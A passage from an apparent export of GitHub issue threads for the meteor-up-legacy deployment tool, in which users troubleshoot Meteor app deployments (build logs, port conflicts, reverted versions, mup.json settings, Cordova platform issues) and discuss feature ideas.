    -----------------------------------STDOUT-----------------------------------

    &gt; fibers@1.0.5 install /opt/app/tmp/bundle/programs/server/node_modules/fibers
    &gt; node ./build.js

    ----------------------------------------------------------------------------
Completed TaskList: Deploy app 'app' (linux)
```

I have node 0.12.0 and I'm not using Mongo.
</Body>
    </Comment>
    <Comment>
      <Owner>zevsuld</Owner>
      <Body>I have same issue too, Ubuntu server 14.04 , node v.0.10.37, meteor version 1.0.3.2

[webserver] - Uploading bundle
[webserver] &#10004; Uploading bundle: SUCCESS
[webserver] - Setting up Environment Variables
[webserver] &#10004; Setting up Environment Variables: SUCCESS
[webserver] - Invoking deployment process
[webserver] &#10008; Invoking deployment process: FAILED

```
-----------------------------------STDERR-----------------------------------
t_dir=/home/mceuser/.node-gyp/0.10.37',
gyp info spawn args   '-Dmodule_root_dir=/opt/mce/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt',
gyp info spawn args   '--depth=.',
gyp info spawn args   '--no-parallel',
gyp info spawn args   '--generator-output',
gyp info spawn args   'build',
gyp info spawn args   '-Goutput_dir=.' ]
gyp info spawn make
gyp info spawn args [ 'BUILDTYPE=Release', '-C', 'build' ]
gyp info ok 
npm WARN package.json meteor-dev-bundle@0.0.0 No description
npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
npm WARN package.json meteor-dev-bundle@0.0.0 No README data
stop: Unknown instance: 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
```

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 80: Connection refused
    App did not pick up! Please check app logs.
    -----------------------------------STDOUT-----------------------------------
    rget/bcrypt_lib.node
      SOLINK_MODULE(target) Release/obj.target/bcrypt_lib.node: Finished
      COPY Release/bcrypt_lib.node
    make: Leaving directory `/opt/mce/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build'

```
&gt; fibers@1.0.1 install /opt/mce/tmp/bundle/programs/server/node_modules/fibers
&gt; node ./build.js

`linux-x64-v8-3.14` exists; testing
Binary is fine; exiting
underscore@1.5.2 node_modules/underscore

semver@4.1.0 node_modules/semver

fibers@1.0.1 node_modules/fibers

eachline@2.3.3 node_modules/eachline
&#9492;&#9472;&#9472; type-of@2.0.1

source-map-support@0.2.8 node_modules/source-map-support
&#9492;&#9472;&#9472; source-map@0.1.32 (amdefine@0.1.0)

chalk@0.5.1 node_modules/chalk
&#9500;&#9472;&#9472; ansi-styles@1.1.0
&#9500;&#9472;&#9472; escape-string-regexp@1.0.3
&#9500;&#9472;&#9472; supports-color@0.2.0
&#9500;&#9472;&#9472; strip-ansi@0.3.0 (ansi-regex@0.2.1)
&#9492;&#9472;&#9472; has-ansi@0.1.0 (ansi-regex@0.2.1)
Waiting for MongoDB to initialize. (5 minutes)
connected
mce start/running, process 2711
Waiting for 45 seconds while app is booting up
Checking is app booted or not?
----------------------------------------------------------------------------
```
</Body>
    </Comment>
    <Comment>
      <Owner>pronevich</Owner>
      <Body>The same issue Ubuntu 14.04 , node 0.10.36, meteor 1.0.4.1
</Body>
    </Comment>
    <Comment>
      <Owner>zevsuld</Owner>
      <Body>mup log shows this, I am using tedious (https://github.com/pekim/tedious) 

/opt/web-mce/app/programs/server/node_modules/fibers/future.js:173
                        throw(ex);
                              ^
Error: Cannot find module 'tedious'
    at Function.Module._resolveFilename (module.js:338:15)
    at Function.Module._load (module.js:280:25)
    at Module.require (module.js:364:17)
    at require (module.js:380:17)
    at Object.Npm.require (/opt/web-mce/app/programs/server/boot.js:129:18)
    at app/server/mssql.js:35:22
    at app/server/mssql.js:606:3
    at /opt/web-mce/app/programs/server/boot.js:205:10
    at Array.forEach (native)
    at Function._.each._.forEach (/opt/web-mce/app/programs/server/node_modules/underscore/underscore.js:79:11)
error: Forever detected script exited with code: 8
error: Script restart attempt #57
</Body>
    </Comment>
    <Comment>
      <Owner>zevsuld</Owner>
      <Body>UPDATE: updated mup, npm,ubuntu. Installed npm tedious package globally, no luck 
</Body>
    </Comment>
    <Comment>
      <Owner>delvedor</Owner>
      <Body>UPDATE:
I've changed  in mup.json

``` json
"setupNode": false,
```

to

``` json
"setupNode": true,
```

With node version 0.12.0 and now all works correctly.
</Body>
    </Comment>
    <Comment>
      <Owner>zevsuld</Owner>
      <Body>successfully deployed :) 
It was my mistake, I am using meteorhacks:npm ,but I was wrapping npm package Npm.require("tedious") instead of Meteor.npmRequire("tedious"). It was working locally fine, but when to deploy it could not find, tedious packages from app folder. 
npm tedious package works async, I am  not using meteorhacks:async, but Npm.require("fibers.future"). On the server side using fibers/future in order to tedious works async inside Meteor.methods. After deployment app seems working fine, but kind of worried that my fibers/future related code might be cause a break.
 I am wondering is it okey to use fibers/futures with meteorhacks:npm package? It works though   
</Body>
    </Comment>
    <Comment>
      <Owner>brylie</Owner>
      <Body>Ah, my mup.json specified an older version of node `0.10.33`. I manually changed the node version to `0.10.36`
</Body>
    </Comment>
    <Comment>
      <Owner>c9s</Owner>
      <Body>I forked this repo and started a new project from this basis,  the deploy script will fix the bcrypt issue automatically. You can just install the mup from here https://github.com/c9s/meteor-up
</Body>
    </Comment>
  </Issue_251>
  <Issue_252>
    <Repository>meteor-up-legacy</Repository>
    <Title>How to update</Title>
    <Owner>arunoda</Owner>
    <Body>Will someone please list the steps to update a deployed site? I have searched a long time and didn't find a solution. I re-ran 'mup setup' and 'mup deploy' but it did not update my site to my latest app changes. I also did make sure my changes were saved. Any responses is appreciated! 
</Body>
    <State>open</State>
    <Comment>
      <Owner>PierreGabioud</Owner>
      <Body>Same problem here. Successful mup deploy but changes are not pushed to server (digital ocean)
</Body>
    </Comment>
    <Comment>
      <Owner>davidrinnan</Owner>
      <Body>check the logs. It might be that the code reverted to previous version due
to an error. It has happened to me that an error occurs but the deploy
routine comes back stating everything is ok.

On Fri, Mar 20, 2015 at 12:06 PM Pierre Gabioud notifications@github.com
wrote:

&gt; Same problem here. Successful mup deploy but changes are not pushed to
&gt; server (digital ocean)
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/322#issuecomment-83986896.
</Body>
    </Comment>
    <Comment>
      <Owner>PierreGabioud</Owner>
      <Body>I checked the logs and I have a EADDRINUSE error, similar to issue #294. Looks like I have another node process running on the port but it's my only app on this droplet so I don't understand.

```
Error: listen EADDRINUSE
   at errnoException (net.js:905:11)
   at Server._listen2 (net.js:1043:14)
    at listen (net.js:1065:10)
    at net.js:1147:9
    at dns.js:72:18
    at process._tickCallback (node.js:442:13)
error: Forever detected script exited with code: 7
 error: Script restart attempt #1180
```
</Body>
    </Comment>
    <Comment>
      <Owner>PierreGabioud</Owner>
      <Body>Solved, I realised that I change the name of my app once in mup.json so I had the old app running with the old name and the new app never running since the port was taken.

Thanks
</Body>
    </Comment>
    <Comment>
      <Owner>townmulti</Owner>
      <Body>It's working for me now. I had to change servers and when I re-installed it was working. I am not running the meteor latest version though. I hope mup now works good with the new meteor upgrade.
</Body>
    </Comment>
  </Issue_252>
  <Issue_253>
    <Repository>meteor-up-legacy</Repository>
    <Title>Ideas for improving the first run experience</Title>
    <Owner>arunoda</Owner>
    <Body>Just a small idea I had, but I was thinking maybe we could make the first run experience a bit easier by prefilling the `appName` property in `mup.json` with the parent directory's name? 

So if I do `mup init` inside `/telescope`, the `appName` would default to `telescope`. 

And maybe `app` could default to `.` instead of `/path/to/the/app`?
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Good idea. Rather than making it default.
Yes. this can be done.

On Wed, Mar 18, 2015 at 2:28 PM Sacha Greif notifications@github.com
wrote:

&gt; Just a small idea I had, but I was thinking maybe we could make the first
&gt; run experience a bit easier by prefilling the appName property in mup.json
&gt; with the parent directory's name?
&gt; 
&gt; So if I do mup init inside /telescope, the appName would default to
&gt; telescope.
&gt; 
&gt; And maybe app could default to . instead of /path/to/the/app?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/320.
</Body>
    </Comment>
  </Issue_253>
  <Issue_254>
    <Repository>meteor-up-legacy</Repository>
    <Title>Reverted to old version of project?</Title>
    <Owner>arunoda</Owner>
    <Body>As soon as I updated mup, it reverted my project to a relatively old version...probably 4 or 5 deploys ago, maybe a handful of commits. Could the update have caused this? 
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Hmm. Mup never changes git or local file system state.

May be your app gets reverted to an older state. Check sever logs.
On 2015 &#3512;&#3535;&#3515;&#3530;&#3501;&#3540; 18, &#3510;&#3503;&#3535;&#3503;&#3535; at &#3508;&#3545;.&#3520;. 11.29 Josiah MacDonald &lt;
notifications@github.com&gt; wrote:

&gt; As soon as I updated mup, it reverted my project to a relatively old
&gt; version...probably 4 or 5 deploys ago, maybe a handful of commits. Could
&gt; the update have caused this?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/319.
</Body>
    </Comment>
    <Comment>
      <Owner>bmx269</Owner>
      <Body>I have the same issue. Just happened.
</Body>
    </Comment>
    <Comment>
      <Owner>jbrozena22</Owner>
      <Body>I'm noticing something similar. Is it possible that mup deploy doesn't clean out old processes before starting a new one? Because it looks like in my app some users are using code from a few (1-5) versions back.
</Body>
    </Comment>
    <Comment>
      <Owner>jhmacdon</Owner>
      <Body>I noticed that it was trying to seed a ton of info during deployment, and if it didnt finish seeding then this stuff started happening. Watch logs with &lt;code&gt;mup logs -f&lt;/code&gt;, add some &lt;code&gt;console.log&lt;/code&gt; statements to your Meteor code and watch where your app ends up when it finishes testing for the apps state. 

Once this issue happened, I wasn't able to fix without destroying my droplet (Digital Ocean) and starting a new one. The actual fix is to run large seeds and such from some sort of admin panel (Houston is a good one).
</Body>
    </Comment>
    <Comment>
      <Owner>tehfailsafe</Owner>
      <Body>Same. Client meeting in 1 hour and now it's displaying version from several commits back. mup setup mup reconfig power cycle server nothing fixes it. I was seeding data with fixtures.js and even after removing the file it keeps running the fixtures...
</Body>
    </Comment>
    <Comment>
      <Owner>255kb</Owner>
      <Body>Same problem here, two apps running behind nginx since months on the same VPS, just updated one (with simple git pull origin master and sudo mup deploy, as usual) and now the server is serving very old versions for both apps (like months old...). 
Restarting the server seems to serve the right version again, and then some minutes after the same old version got served.
I cannot figure out where this come from.
</Body>
    </Comment>
    <Comment>
      <Owner>hsduk</Owner>
      <Body>I just experienced this problem. I don't think the error message is correct - "Redeploying previous version of the app".
My app grew in size over several deployments and as expected, the app took longer to start. 
I changed mup.json "deployCheckWaitTime" when I first deployed to 30 secs. Changing it to 45 secs removed this error message,
Would suggest that mup calculates the time to start the server and stores this.
Also change "deployCheckWaitTime" to start its clock when the last server startup time is up.
So if lastStartDuration (or average?) was 20seconds, having a deployCheckWaitTime of 15secs would trigger this error, that the deployment was unsuccessful after 35seconds ( lastStartDuration + deployCheckWaitTime ).
Setting deployCheckWaitTime to something bigger like 60seconds without polling the http port makes deployment take too long.
</Body>
    </Comment>
  </Issue_254>
  <Issue_255>
    <Repository>meteor-up-legacy</Repository>
    <Title>Specify cipher options in stud conf</Title>
    <Owner>arunoda</Owner>
    <Body>There does not appear to be any way to specify ciphers and such for stud. Per http://baudehlo.com/2013/06/24/setting-up-perfect-forward-secrecy-for-nginx-or-stud/, it appears doing so might be necessary to make perfect forward secrecy work.
</Body>
    <State>open</State>
    <Comment>
      <Owner>fongandrew</Owner>
      <Body>This could also be addressed more generally by allowing miscellaneous setup customization -- e.g. run user-provided script after everything else in `mup setup`.
</Body>
    </Comment>
  </Issue_255>
  <Issue_256>
    <Repository>meteor-up-legacy</Repository>
    <Title>Confused about how mup works</Title>
    <Owner>arunoda</Owner>
    <Body>Let's say I develop Meteor apps on my Mac, and want to deploy on a Debian VPS. Am I supposed to run `mup init/setup/deploy` on the VPS? Or on my Mac? It sounds like it runs on my desktop machine, and uses ssh/scp to bundle and copy my app to the VPS. But then how does it actually run the Node.js web server on the VPS and keep it running 24/7?
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>It runs on your Linux of Mac Desktop. Try to use ubuntu.
Check this screencast for more: https://www.youtube.com/watch?v=WLGdXtZMmiI
</Body>
    </Comment>
    <Comment>
      <Owner>ghost</Owner>
      <Body>Ah I think I see. So I install it on my Mac using `npm install -g mup` and it deploys my Meteor app to an Ubuntu or Debian server.
</Body>
    </Comment>
    <Comment>
      <Owner>allpratik</Owner>
      <Body>I did installed mup using `npm install -g mup` . But when I use `mup init` just nothing happens? I don't why? It does not creates any file.
</Body>
    </Comment>
    <Comment>
      <Owner>jimmy1993k</Owner>
      <Body>Just read the documentation, it is explained quite clearly. You use `mup init` and it creates a mup.json where you can put all your server settings for your application, and a settings.json, which is to be used by your meteor application. Then you type `mup setup` to setup your server, installing NodeJS, MongoDB and PhantomJS if you so wish for it. And last but not least you type `mup deploy` which will build the application on your desktop, upload it to your VPS and start it with upstart, upstart is also responsible for keeping it running 24/7. 
</Body>
    </Comment>
    <Comment>
      <Owner>kaushik1979</Owner>
      <Body>I have the same problem. I am trying to deploy my app from EC2 Ubuntu machine -  x86_64. When I do mup init, nothing happens. No files created. I tried the same with mupx and the same result.
</Body>
    </Comment>
  </Issue_256>
  <Issue_257>
    <Repository>meteor-up-legacy</Repository>
    <Title>Static content server</Title>
    <Owner>arunoda</Owner>
    <Body>It would be great if mup would install and configure something performant to serve the static content.
</Body>
    <State>open</State>
    <Comment>
      <Owner>jhmacdon</Owner>
      <Body>I didn't really think this was the point of Meteor?
</Body>
    </Comment>
    <Comment>
      <Owner>MaazAli</Owner>
      <Body>@jhmacdon what do you mean?
</Body>
    </Comment>
    <Comment>
      <Owner>timothyarmes</Owner>
      <Body>Meteor isn't good at all at serving static assets, however most web sites have a few. A good solution is to have something like nginx in front of Meteor to serve the public folder, and pass everything else on. If mup could set up and configure a server for the static content that would be useful.
</Body>
    </Comment>
    <Comment>
      <Owner>jhmacdon</Owner>
      <Body>Got it, I misunderstood this to mean a static site, not just static content. My bad.

I fully agree though
</Body>
    </Comment>
    <Comment>
      <Owner>derwaldgeist</Owner>
      <Body>+1 I was also wondering if I could use the nginx setup with mup to serve a static landing page. Would be awsome!
</Body>
    </Comment>
  </Issue_257>
  <Issue_258>
    <Repository>meteor-up-legacy</Repository>
    <Title>Added pulldb option to pull data from production database </Title>
    <Owner>arunoda</Owner>
    <Body>Hi there!

Added option to automatically pull production database from server.

``` bash
$&gt; mup pulldb
```

However, this change requires a custom nodemiral version at https://github.com/raedle/nodemiral. Pull request for nodemiral has been sent https://github.com/arunoda/nodemiral/pull/11
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Hey, thanks for this.
But, not everyone is using mup's MongoDB on the server. So, having this command is confusing.

But I know this is a good one. So, let me suggest a new way of doing this.

Rather than directly integrating this into mup. Let's use another npm module for this.

For an example, here's what we do:

```
npm i -g mup-pulldb
```

then invoke

```
mup pulldb
```

Then mup will simply pass configurations to the pubdb via stdin. Then you can use that to do the stuff you want. That's a simple plugin architecture for mup.
</Body>
    </Comment>
    <Comment>
      <Owner>raedle</Owner>
      <Body>Haven't thought of cases when people not use mup's MongoDB.

Not sure if I understand you correctly. Are you suggesting to fork node modules by calling them as mup option parameter?

So, `$&gt; mup my-plugin` would fork `mup-my-plugin` and pass the mup configuration via stdin to the forked node process?
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Give me a until next monday, I'll build a complete plugin system for mup.
You don't need to change a lot in your code base.

On Wed, Feb 25, 2015 at 1:38 PM Roman R&#228;dle notifications@github.com
wrote:

&gt; Haven't thought of instances not using mup's MongoDB.
&gt; 
&gt; Not sure if I understand you correctly. Are you suggesting to fork node
&gt; modules by calling them as mup option parameter?
&gt; 
&gt; So, $&gt; mup my-plugin would fork mup-my-plugin and pass the mup
&gt; configuration via stdin to the forked node process?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/pull/288#issuecomment-75920839.
</Body>
    </Comment>
    <Comment>
      <Owner>raedle</Owner>
      <Body>That'll be awesome! :+1: 

I like your working pace :)
</Body>
    </Comment>
    <Comment>
      <Owner>raedle</Owner>
      <Body>Hi! Just wanted to come back to you on this topic. Did you have time yet to work on the mup plugin system?
</Body>
    </Comment>
  </Issue_258>
  <Issue_259>
    <Repository>meteor-up-legacy</Repository>
    <Title>Adjust MinUptime that forever uses</Title>
    <Owner>arunoda</Owner>
    <Body>Tried to find an answer in the readme but I failed. 

Had an issue with a bug that got deployed and it was not initiated until after 2 seconds which meant it was looping. I would like to adjust the value permanently. Can I do that via configuration? 
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>It's not possible via config. You need to fork and use mup yourself.
This is the file you need to edit:
https://github.com/arunoda/meteor-up/blob/master/templates/linux/meteor.conf#L26

May be you can send me a PR which can be changed it from an env variable.

On Wed Feb 18 2015 at 4:32:12 AM David Rinnan notifications@github.com
wrote:

&gt; Tried to find an answer in the readme but I failed.
&gt; 
&gt; Had an issue with a bug that got deployed and it was not initiated until
&gt; after 2 seconds which meant it was looping. I would like to adjust the
&gt; value permanently. Can I do that via configuration?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/269.
</Body>
    </Comment>
    <Comment>
      <Owner>davidrinnan</Owner>
      <Body>ok thanks! 
Ill try to get some time to do a PR! 
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>great.

On Wed Feb 18 2015 at 4:36:35 AM David Rinnan notifications@github.com
wrote:

&gt; ok thanks!
&gt; Ill try to get some time to do a PR!
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/269#issuecomment-74775013.
</Body>
    </Comment>
    <Comment>
      <Owner>davidrinnan</Owner>
      <Body>is linux/meteor.conf only run with setup? or reconfig as well? 
</Body>
    </Comment>
    <Comment>
      <Owner>davidrinnan</Owner>
      <Body>I have made a PR #271 
while writing this it struck my mind that I havnt actually tested it. :) 
pretty straight forward though. 

How do you normally carry out testing for MUP? I dont have a server available strictly for testing purposes. Any good suggestions on how to test without a server? 
</Body>
    </Comment>
  </Issue_259>
  <Issue_260>
    <Repository>meteor-up-legacy</Repository>
    <Title>Don't seem to be getting any errors, but can't access my server</Title>
    <Owner>arunoda</Owner>
    <Body>Sorry if I'm just being dumb - I can't figure out how to get this running though.

Brand new DigitalOcean image; was going to host Mongo locally rather than using Compose ($) -

```
{
  // Server authentication info
  "servers": [
    {
      "host": "100.100.100.100", // replaced with actual IP
      "username": "root",
      "pem": "~/.ssh/id_rsa"
    }
  ],


  "setupMongo": true,

  "setupNode": true,

  "nodeVersion": "0.10.33",

  "setupPhantom": true,

  "appName": "stories",

  "app": ".",

  "env": {
    "ROOT_URL": "http://100.100.100.100",
    "PORT": "3001"
  },

  "deployCheckWaitTime": 30
}
```

afaik from reading the docs, it should just figure out the local mongo URL by itself?

Deploying works with no errors - `mup logs -f`

```
Meteor Up: Production Quality Meteor Deployments
------------------------------------------------

 &gt;&gt; stepping down to gid: meteoruser
 &gt;&gt; stepping down to uid: meteoruser
```

```
$ ssh 100.100.100.100
$ curl localhost:3001

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;link rel="stylesheet" type="text/css" class="__meteor-css__" href="/48548b5b43343321ec7c6345b2bdbe36efc32205.css?meteor_css_resource=true"&gt;


&lt;script type="text/javascript"&gt;__meteor_runtime_config__ = {"meteorRelease":"METEOR@1.0.2.1","ROOT_URL":"http://188.166.39.157","ROOT_URL_PATH_PREFIX":"","autoupdateVersion":"31654ccc53a11b3e4347a118bd7283bb65f88db7","autoupdateVersionRefreshable":"cd19ee7f9583e501a4263ce72bb0dd2ded800356","autoupdateVersionCordova":"d100f5651b90251c2e24ae6c4fa6013735ea8523"};&lt;/script&gt;

  &lt;script type="text/javascript" src="/233e6b641a4cb465740c3b40b04fff1102f3a711.js"&gt;&lt;/script&gt;
&lt;title&gt;My Meteor App&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;/html&gt;
```

So it looks like it's all working &amp; serving.

But then in my browser, going to `100.100.100.100:3001` just says 'this webpage is not available.

Not sure what to do next. Not sure if the nginx bit in the guide is optional or not - do I need to set it up even if I'm just running one meteor app on this server?
</Body>
    <State>open</State>
    <Comment>
      <Owner>davidrinnan</Owner>
      <Body>No idea really. :) 
Are you maybe just having an issue with port 3001 not being available from the outside? 

what happens if you run it on port 80 instead, so long as you dont have anything else on that port that is. 

What happens if you do this in a js file and run it with node. Set the port to let's say 3002. can you reach if from the outside? 

// Load the http module to create an http server.
var http = require('http');

// Configure our HTTP server to respond with Hello World to all requests.
var server = http.createServer(function (request, response) {
  response.writeHead(200, {"Content-Type": "text/plain"});
  response.end("Hello World\n");
});

// Listen on port 8000, IP defaults to 127.0.0.1
server.listen(8000);

// Put a friendly message on the terminal
console.log("Server running at http://127.0.0.1:8000/");
</Body>
    </Comment>
    <Comment>
      <Owner>jongold</Owner>
      <Body>Yeah, that works. I'm kind of stumped; I don't know enough about how Meteor runs as a Node process to figure out why it's not picking up.

I saw in #202 that force-ssl might be the problem; tried disabling it, no luck.

From Sacha's video it looked like you don't need nginx to be setup for things to run? What else would cause the port to not be open?
</Body>
    </Comment>
    <Comment>
      <Owner>jonwhittlestone</Owner>
      <Body>I am having a similar issue. Have deployed a Meteor app with no problems using mup. Then on the same Linode machine - with port 3001 - no joy. I am using an nginx vhost.

[SO Post - Hosting multiple meteor apps on Linode with mup](http://stackoverflow.com/questions/29021863/hosting-multiple-meteor-apps-on-linode-with-mup)
</Body>
    </Comment>
  </Issue_260>
  <Issue_261>
    <Repository>meteor-up-legacy</Repository>
    <Title>Mup fails with /opt/myapp-staging/tmp/bundle.tar.gz: No such file or directory when deploying from subdir and having appName different from root dir name</Title>
    <Owner>arunoda</Owner>
    <Body>This problem can be reproduced if you have mup files in subdir and have appName that differs from your app folder name. I want to set up two environments on same server and have application root folder name 'myapp'. I create folder /myapp/deploy/staging. Then I move mup files and settings files inside /myapp/deploy/staging. I change appName in mup config to 'staging' or to 'myapp-staging'. I get this error.
</Body>
    <State>open</State>
    <Comment>
      <Owner>Firfi</Owner>
      <Body>I described issue wrong
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>What was the (correct) issue?

On Mon Jan 26 2015 at 9:28:42 AM Igor Loskutov notifications@github.com
wrote:

&gt; I described issue wrong
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/236#issuecomment-71412308.
</Body>
    </Comment>
    <Comment>
      <Owner>Firfi</Owner>
      <Body>Updated and reopened. @arunoda wow that answer was really quick : )
</Body>
    </Comment>
    <Comment>
      <Owner>Firfi</Owner>
      <Body>Also I ran `npm i -g mup` before trying
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Okay. I'll be working on major mup upgrade soon. I'll work on this.
</Body>
    </Comment>
    <Comment>
      <Owner>rafaelfaria</Owner>
      <Body>It also happens to me.
</Body>
    </Comment>
    <Comment>
      <Owner>dhruvkar</Owner>
      <Body>I'm having this same issue. You guys have a recommendation for structuring a staging/production folders while this is being worked out? 
</Body>
    </Comment>
    <Comment>
      <Owner>Firfi</Owner>
      <Body>I moved to Ansible deploy
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>If you change the appName it's very important to do mup setup first. Also, we need to stop the old app before renaming. Otherwise, there'll be port collisions. 
</Body>
    </Comment>
    <Comment>
      <Owner>dhruvkar</Owner>
      <Body>Thanks for the speedy responses. Did both (mup setup and stopped old app) and was able to deploy successfully.
</Body>
    </Comment>
  </Issue_261>
  <Issue_262>
    <Repository>meteor-up-legacy</Repository>
    <Title>Your app's platforms have changed. Restart meteor to use the new set of platforms.</Title>
    <Owner>arunoda</Owner>
    <Body>Hello,

It's strange, I use mup for months, but now, each time I mup deploy, my local meteor app close with this message:

```
Your app's platforms have changed.
Restart meteor to use the new set of platforms.
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>danopia</Owner>
      <Body>I'm seeing this too, seems like mup keeps adding `firefoxos` as a platform?
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>We add firefoxos to build the web output for cordova apps.
If you are deploying your app, while running your app in another terminal,
try not to do that.

That might fix the issue.

On Thu Jan 29 2015 at 2:49:55 PM Daniel Lamando notifications@github.com
wrote:

&gt; I'm seeing this too, seems like mup keeps adding firefoxos as a platform?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/229#issuecomment-71992870.
</Body>
    </Comment>
    <Comment>
      <Owner>acemtp</Owner>
      <Body>Just to understand, if we remove ios/android platform, it should stop using firefoxos and so it should not break the meteor run when deploying?
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>yes.

On Thu Jan 29 2015 at 3:25:01 PM Vianney Lecroart notifications@github.com
wrote:

&gt; Just to understand, if we remove ios/android platform, it should stop
&gt; using firefoxos and so it should not break the meteor run when deploying?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/229#issuecomment-71997241.
</Body>
    </Comment>
    <Comment>
      <Owner>ddresch</Owner>
      <Body>This process is really a bit of a hack in my opinion. I know this is the currently proposed way of using this dummy platform to get the hot code push stuff integrated, but I'm facing now the case codova plugins I'm using are not compiling or just drop errors during build process.

Wouldn't it be an option to check if the machine the build is processed on has the needed libs to build the installed platforms? In the case of a SDK free build box use `firefoxos`.

Right now the process is checking if there are mobile platforms added, copy the platform file and write a dummy with `firefoxos` but this seems to break in some combination with e.g. iOS only codova plugins. Or a mup option to overwrite this behavior. 

_this is the error I got_

```
-------------------STDERR-------------------
lib/node_modules/cordova/node_modules/q/q.js:574:44
at flush
(/Users/user/.meteor/packages/meteor-tool/.1.0.40.54fp8a++os.osx.x86_64+web.browser+web.cordova/meteor-tool-os.osx.x86_64/dev_bundle/lib/node_modules/cordova/node_modules/q/q.js:108:17)
at process._tickCallback (node.js:419:13)

Creating firefoxos project...
Creating Firefox OS project
Project Path platforms/firefoxos
Package Name tld.domain.myapp
Project Name MyApp
Installing "com.hutchind.cordova.plugins.streamingmedia" for firefoxos
Installing "com.meteor.cordova-update" for firefoxos
Installing "com.rjfun.cordova.plugin.lowlatencyaudio" for firefoxos
Installing "com.sebible.cordova.videosnapshot" for firefoxos
Installing "nl.x-services.plugins.launchmyapp" for firefoxos


/usr/local/lib/node_modules/mup/lib/build.sh: line 42: cd: /tmp/c490b6be-a506-4c55-8604-b8cd59322fcc: No such file or directory
tar: bundle: Cannot stat: No such file or directory
tar: Error exit delayed from previous errors.
```

After this error the attempt to do again a mup deploy ends in never ending `Building Started: ../../app`

@arunoda Please let me know if you already faced this situation and found a possible workaround.

Maybe I'm wrong but following this thread it's really the case firefoxos is not requiring any prerequisites but still it tries to compile the plugins?

https://groups.google.com/forum/#!msg/meteor-core/qjq_lnRHlZU/q9c8I8A1DdsJ 
</Body>
    </Comment>
    <Comment>
      <Owner>lorensr</Owner>
      <Body>It might be better, if possible, for the changing of `.meteor/platforms` to be done elsewhere &#8211; either in a copied app directory or on the server. That would both allow running the dev server at the same time (mine is almost always running, and I always have to restart), as well as prevent accidental version control problems while `meteor up` is running, like committing the wrong `.meteor/platforms` or adding `.meteor/platforms-copy`
</Body>
    </Comment>
    <Comment>
      <Owner>stormbkk87</Owner>
      <Body>Is there any fix for this for Cordova deployments? If I remove the browser platform, it works fine, but then it adds browser back in when I do a second deploy.

```
Creating firefoxos project...
Project Path platforms/firefoxos
Installing "com.phonegap.plugins.facebookconnect" for firefoxos
/opt/local/lib/node_modules/mup/lib/build.sh: line 42: cd: /tmp/44312ffc-0c07-4952-8824-bae66568a927: No such file or directory
tar: bundle: Cannot stat: No such file or directory
```
</Body>
    </Comment>
    <Comment>
      <Owner>lorensr</Owner>
      <Body>If your dev meteor app is in `/foo`, when you want to deploy, copy `/foo` to `/bar` and list `/bar` as your meteor app directory in the `mup` config.
</Body>
    </Comment>
    <Comment>
      <Owner>lorensr</Owner>
      <Body>See also #365
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Okay. Now mup do not change platform code.
Try to use the newest version of mup.

More info: 0cbbecb0dead8b049cc2a66321524e923a5635bb
</Body>
    </Comment>
  </Issue_262>
  <Issue_263>
    <Repository>meteor-up-legacy</Repository>
    <Title>in mup.json env.PORT should be a string not integer</Title>
    <Owner>arunoda</Owner>
    <Body>I had this message with "PORT": 3000

```
mup deploy

Meteor Up: Production Quality Meteor Deployments
------------------------------------------------

Building Started: /Users/laurent/dev/meteor/yo-battle

Started TaskList: Deploy app 'yo-battle' (linux)
[146.185.134.77] - Uploading bundle
[146.185.134.77] &#10004; Uploading bundle: SUCCESS
[146.185.134.77] - Setting up Environment Variables

undefined:24
  throw err;
        ^
TypeError: ejs:8
    6| #it is possible to override above env-vars from the user-provided values
    7| &lt;% for(var key in env) { %&gt;
 &gt;&gt; 8|   export &lt;%- key %&gt;=&lt;%- env[key].replace(/./ig, '\\$&amp;') %&gt;
    9| &lt;% } %&gt;
    10| 

Object 3000 has no method 'replace'
